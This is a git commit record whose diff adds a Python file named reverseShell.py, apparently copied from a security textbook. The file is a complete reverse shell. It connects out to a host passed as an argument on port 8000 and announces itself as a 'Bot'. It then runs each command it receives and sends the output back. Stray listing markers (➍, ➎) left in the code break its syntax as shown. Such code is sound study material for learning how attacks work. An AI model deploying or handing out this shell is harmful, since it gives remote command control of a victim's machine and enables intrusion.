bb01d7b350fb69827b1cbdb7855a957289080c53
Piotr Wlazeł <38163577+Nieokorzesany@users.noreply.github.com>
2021-11-19 21:50:26 +0100

    Update reverseShell.py

--- python/reverseShell.py
+++ python/reverseShell.py
@@ -1,1 +1,16 @@
-
+import sys
+from subprocess import Popen, PIPE
+from socket import *
+serverName = sys.argv[1]
+serverPort = 8000
+#Create IPv4(AF_INET), TCPSocket(Sock_Stream)
+clientSocket = socket(AF_INET, SOCK_STREAM)
+clientSocket.connect((serverName, serverPort))
+clientSocket.send('Bot reporting for duty'.encode()) ➍
+command = clientSocket.recv(4064).decode() ➎
+while command != "exit":
+  proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
+  result, err = proc.communicate()
+  clientSocket.send(result)
+  command = (clientSocket.recv(4064)).decode()
+clientSocket.close()
